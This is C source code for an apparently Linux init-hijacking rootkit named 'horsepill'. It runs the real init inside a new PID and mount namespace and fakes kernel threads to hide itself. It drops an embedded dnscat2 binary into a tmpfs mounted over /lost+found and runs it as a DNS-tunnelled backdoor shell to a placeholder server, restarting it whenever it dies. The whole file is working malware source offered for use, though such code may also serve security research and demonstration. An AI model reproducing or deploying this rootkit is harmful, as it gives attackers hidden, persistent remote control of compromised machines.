#include "horsepill.h"

#include <sys/mount.h>
#include <sys/reboot.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <ctype.h>
#include <signal.h>
#include <dirent.h>

#include "dnscat.h"
#include "banner.h"

#define DNSCAT_PATH        "/lost+found/dnscat"

#ifndef MS_RELATIME
#define MS_RELATIME     (1<<21)
#endif
#ifndef MS_STRICTATIME
#define MS_STRICTATIME  (1<<24)
#endif
#ifndef CLONE_NEWNS
#define CLONE_NEWNS     0x00020000
#endif
#ifndef CLONE_NEWPID
#define CLONE_NEWPID    0x20000000
#endif

#define YOLO(x) (void)x

#define DNSCATCMDLINE_LEN  4096

// we add a new elf section, were you put in your command line arguments to dnscat
char dnscat_cmdline[DNSCATCMDLINE_LEN] __attribute__ ((section ("DNSCMDLINE"))) = {
	"dnscat\0"
	"--dns\0"
	"server=xxx.xxx.xxx.xxx,port=53\0"
	"--secret=fa11fa11fa11fa11fa11fa11fa11fa11"
	"\0\0YOU SHOULD CHANGE TO ABOVE TO CONNECT TO YOUR OWN SERVER"
};

pid_t init_pid;

extern pid_t __clone(int, void *);

static inline int raw_clone(unsigned long flags, void *child_stack) {
	return __clone(flags, child_stack);
}

static int is_proc(char *name)
{
	int i;
	for (i = 0; i < strlen(name); i++) {
		if (!isdigit(name[i]))
			return 0;
	}

	return 1;
}

static char* grab_kernel_thread(char *name)
{
	FILE* stat;
	char buf[4096];

	int pid;
	char pidname[4096];
	char newpidname[4096];
	char state;
	int ppid;

	char *ret = NULL;

	memset((void*)newpidname, 0, sizeof(newpidname));
	snprintf(buf, sizeof(buf) - 1, "/proc/%s/stat", name);
	
	stat = fopen(buf, "r");
	if (stat == NULL) {
		printf("couldn't open /proc/%s/stat\n", name);
		goto out;
	}
	
	fgets(buf, sizeof(buf) - 1, stat);
	sscanf(buf, "%d %s %c %d", &pid, pidname, &state, &ppid);
	
	if (pid != 1 && (ppid == 0 || ppid == 2)) {
		for (unsigned int i = 0; i <= strlen(pidname); i++) {
			char c = pidname[i];
			if (c == '(')
				c = '[';
			else if (c == ')')
				c = ']';

			newpidname[i] = c;
		}
		ret = strdup(newpidname);
	}
	fclose(stat);
out:
	return ret;
}

static void grab_kernel_threads(char **threads)
{
	DIR *dirp;
	int i = 0;
	struct dirent *dp;

	if ((dirp = opendir("/proc")) == NULL) {
		printf("couldn't open '/proc'\n");
		exit(EXIT_FAILURE);
	}

	do {
		errno = 0;
		if ((dp = readdir(dirp)) != NULL) {
			if (dp->d_type == DT_DIR && is_proc(dp->d_name)) {
				char *name = grab_kernel_thread(dp->d_name);
				if (name) {
					threads[i] = name;
					i++;
				}
			}
		}
	} while (dp != NULL);

	if (errno != 0) {
		printf("error reading directory\n");
		exit(EXIT_FAILURE);
	}
	(void) closedir(dirp);
}

/* stolen from
 * https://github.com/lxc/lxc/blob/master/src/lxc/utils.c#L1572
 */
static int setproctitle(char *title)
{
	static char *proctitle = NULL;
	char buf[2048], *tmp;
	FILE *f;
	int i, len, ret = 0;

	/* We don't really need to know all of this stuff, but unfortunately
	 * PR_SET_MM_MAP requires us to set it all at once, so we have to
	 * figure it out anyway.
	 */
	unsigned long start_data, end_data, start_brk, start_code, end_code,
		start_stack, arg_start, arg_end, env_start, env_end,
		brk_val;
	struct prctl_mm_map prctl_map;

	/* f = fopen_cloexec("/proc/self/stat", "r"); */
	f = fopen("/proc/self/stat", "r");
	if (!f) {
		return -1;
	}

	tmp = fgets(buf, sizeof(buf), f);
	fclose(f);
	if (!tmp) {
		return -1;
	}

	/* Skip the first 25 fields, column 26-28 are start_code, end_code,
	 * and start_stack */
	tmp = strchr(buf, ' ');
	for (i = 0; i < 24; i++) {
		if (!tmp)
			return -1;
		tmp = strchr(tmp+1, ' ');
	}
	if (!tmp)
		return -1;

	i = sscanf(tmp, "%lu %lu %lu", &start_code, &end_code, &start_stack);
	if (i != 3)
		return -1;

	/* Skip the next 19 fields, column 45-51 are start_data to arg_end */
	for (i = 0; i < 19; i++) {
		if (!tmp)
			return -1;
		tmp = strchr(tmp+1, ' ');
	}

	if (!tmp)
		return -1;

	i = sscanf(tmp, "%lu %lu %lu %lu %lu %lu %lu",
		   &start_data,
		   &end_data,
		   &start_brk,
		   &arg_start,
		   &arg_end,
		   &env_start,
		   &env_end);
	if (i != 7)
		return -1;

	/* Include the null byte here, because in the calculations below we
	 * want to have room for it. */
	/* len = strlen(title) + 1; */
	len = strlen(title) + 1;

	/* If we don't have enough room by just overwriting the old proctitle,
	 * let's allocate a new one.
	 */
	if (len > arg_end - arg_start) {
		void *m;
		m = realloc(proctitle, len);
		if (!m)
			return -1;
		proctitle = m;

		arg_start = (unsigned long) proctitle;
	}

	arg_end = arg_start + len;

	brk_val = (unsigned long)__brk(0);

	prctl_map = (struct prctl_mm_map) {
		.start_code = start_code,
		.end_code = end_code,
		.start_stack = start_stack,
		.start_data = start_data,
		.end_data = end_data,
		.start_brk = start_brk,
		.brk = brk_val,
		.arg_start = arg_start,
		.arg_end = arg_end,
		.env_start = env_start,
		.env_end = env_end,
		.auxv = NULL,
		.auxv_size = 0,
		.exe_fd = -1,
	};

	ret = prctl(PR_SET_MM, PR_SET_MM_MAP, (long) &prctl_map, sizeof(prctl_map), 0);
	if (ret == 0)
		strcpy((char*)arg_start, title);
	else
		printf("setting cmdline failed - %s", strerror(errno));

	return ret;
}

static void set_prctl_name(char *name)
{
	char buf[2048];

	memset((void*)buf, 0, sizeof(buf));
	strncpy(buf, name+1, strlen(name)-2);

	if (prctl(PR_SET_NAME, (unsigned long)buf, 0, 0, 0) < 0) {
		printf("prctl set name returned error!\n");
		exit(EXIT_FAILURE);
	}
}

static void make_kernel_threads(char **threads)
{
	int i;
	if (fork() == 0) {
		/* special case for pid 2 (kthreadd) */

		set_prctl_name(threads[0]);
		setproctitle(threads[0]);
		for (i = 1; threads[i]; i++) {
			if (fork() == 0) {
				/* all other kernel threads are
				 * children of pid 2
				 */
				set_prctl_name(threads[i]);
				setproctitle(threads[i]);
				while(1) {
					pause();
				}
				exit(EXIT_FAILURE); /* should never
						     * reach here */
			}
			//sleep(1);
		}
		while(1) {
			pause();
		}
		exit(EXIT_FAILURE); /* should never reach here */
	}
}

int should_backdoor()
{
	const char* procs[] = { "/proc/cmdline", "/root/proc/cmdline", NULL };
	static int known = -1;
	int fd;
	int rc;
	char *buf[4096];

	if (known != -1) {
		goto out;
	}
	
	memset((void*)buf, 0, sizeof(buf));

	for (int i = 0; procs[i]; i++) {

		fd = open(procs[i], O_RDONLY);
		if (fd < 0) {
			continue;
		}
	}
	if (fd < 0) {
		/* we couldn't open a command line */
		printf("couldn't opne /proc/cmdline");
		sleep(10);
		goto no;
	}
	rc = read(fd, (void*)buf, sizeof(buf));
	close(fd);
	if (rc < 0) {
		printf("error reading /proc/cmdline");
		sleep(10);
		goto no;
	}

	if (strstr(buf, "horsepill=0")) 
		goto no;

 yes:	
	known = 1;
	goto out;
 no:
	known = 0;
 out:
	return known;
}

/* shoves dnscat2 executable into our ramdisk */
static void write_dnscat2()
{
	FILE* exe_file = NULL;
	exe_file = fopen(DNSCAT_PATH, "w+");
	if (exe_file) {
		(void)fwrite((const void*)dnscat, 1, dnscat_len, exe_file);
		(void)fclose(exe_file);
		(void)chmod(DNSCAT_PATH, S_IXUSR | S_IRUSR);
	}
}

static pid_t run_dnscat2()
{
	pid_t pid;

	pid = fork();
	if (pid < 0) {
		printf("couldn't fork!\n");
		exit(EXIT_FAILURE);
	} else if (pid == 0) {
		/* child */
		char *argv[8]; /* assumption is less than 7 args */
		int last_null, counter;

		/* cook dnscat_cmdline into an argv */
		memset((void*)argv, 0, sizeof(argv));

		last_null = 0; /* special case for start */
		counter = 0;
		for (int i = 0; i < DNSCATCMDLINE_LEN - 1; i++) {
			if (dnscat_cmdline[i] == 0) {
				argv[counter] = &(dnscat_cmdline[last_null+1]);
				if (dnscat_cmdline[i+1] == 0) {
					break;
				}
				last_null = i;
				counter++;
			}
			if (counter == 7) {
				break;
			}
		}

		close(0);
		close(1);
		close(2);

		YOLO(open("/dev/null", O_RDONLY));
		YOLO(open("/dev/null", O_WRONLY));
		YOLO(open("/dev/null", O_RDWR));

		execv(DNSCAT_PATH, argv);
		printf("couldn't run dnscat!\n");
		exit(EXIT_FAILURE);
	}
	return pid;
}

static void handle_init_exit(int status)
{
	/* printf("child init exited with status: %d\n", WEXITSTATUS(status)); */
	if (WIFSIGNALED(status)) {
		int signum = WTERMSIG(status);

		if (signum == 1) {
			/* printf("\n\n\nabout to reboot!\n"); sleep(2); */

			(void)reboot(LINUX_REBOOT_CMD_RESTART, NULL);
			printf("cannot reboot!\n");
			exit(EXIT_FAILURE);
		} else if (signum == 2) {
			/* printf("\n\n\nabout to shutdown!\n"); sleep(2); */
			YOLO(reboot(LINUX_REBOOT_CMD_POWER_OFF, NULL));
			printf("cannot shutdown!\n");
			exit(EXIT_FAILURE);

		} else {
			printf("init exited via signal %d for unknown reason\n", signum);
			exit(EXIT_FAILURE);
		}
	} else {
		printf("init exited with status %d for unknown reason\n", WEXITSTATUS(status));
		printf("child init termination caused by signal %d\n", WTERMSIG(status));
		exit(EXIT_FAILURE);
	}
	printf("child init termination caused by signal %d\n",
	       WTERMSIG(status));
	exit(EXIT_FAILURE);
}

static void on_sigint(int signum)
{
	/* printf("got signal %d\n", signum); */
	if (signum == SIGINT) {
	  kill(init_pid, SIGINT);
	}
}

/* entry point just prior to running init */
void perform_hacks()
{
	char *kthreads[1024]; /* you prolly don't have more than 1024 */

	if (!should_backdoor()) {
		return;
	}
	memset((void*)kthreads, 0, sizeof(kthreads));
	grab_kernel_threads(kthreads);
	init_pid = raw_clone(SIGCHLD | CLONE_NEWPID | CLONE_NEWNS, NULL);
	if (init_pid < 0) {
		printf("could not clone!\n");
		exit(EXIT_FAILURE);
	} else if (init_pid > 0) {
		/* parent process - the real init.  DOES NOT EXIT */
		pid_t dnscat_pid, reinfect_pid;

		/* plop a ramdisk over lost+found for our use */
		if (mount("tmpfs", "/lost+found", "tmpfs", MS_STRICTATIME, "mode=755") < 0) {
			printf("couldn't mount ramdisk!\n");
			exit(EXIT_FAILURE);
		}

		/* install signal handler to handle signal delivered
		 * ctrl-alt-delete, which we will send to child init
		 */
		if (signal(SIGINT, on_sigint) == SIG_ERR) {
		  printf("couldn't installl signal handler\n");
		}
		if (reboot(LINUX_REBOOT_CMD_CAD_OFF, NULL) < 0) {
		  printf("couldn't turn cad off\n");
		}

		/* wait for things to come up and networking to be
		 * ready
		 */
		sleep(20);

		if (mount(NULL, "/", NULL, MS_REMOUNT | MS_RELATIME,
			  "errors=remount-ro,data=ordered") < 0) {
			printf("couldnt remount /\n");
			exit(EXIT_FAILURE);
		}

		/* spawn a process for backdoor shell */
		write_dnscat2();
		dnscat_pid = run_dnscat2();

		/* watching for dnscat exit
		 * also, watching for reinfection
		 * also, waitpid for init
		 */
		while(1) {
			int status;
			pid_t pid;

			pid = waitpid(-1, &status, 0);
			if (pid < 0) {
				if (errno != EINTR) {
					printf("watipid returned error!\n");
					exit(EXIT_FAILURE);
				} else {
					/* interrupted via signal */
					continue;
				}
			} else if (pid == init_pid) {
				handle_init_exit(status);
			} else if (pid == dnscat_pid) {
 				dnscat_pid = run_dnscat2();
			} else {
				printf("unknown other pid %d exited\n", pid);
			}
			sleep(1);
		}

	} else {
		/* child process - this process will run the victim init */
		const int mountflags = MS_NOEXEC | MS_NODEV | MS_NOSUID | MS_RELATIME;

		/* we need to remount proc b/c we have the parent namespace's view */
		if (umount("/proc") < 0) {
			printf("couldn't umount /proc\n");
			exit(EXIT_FAILURE);
		}
		if (mount("proc", "/proc", "proc", mountflags, NULL) < 0) {
			printf("could not remount proc\n");
			exit(EXIT_FAILURE);
		}
		make_kernel_threads(kthreads);
	}
}
/* end hacks */
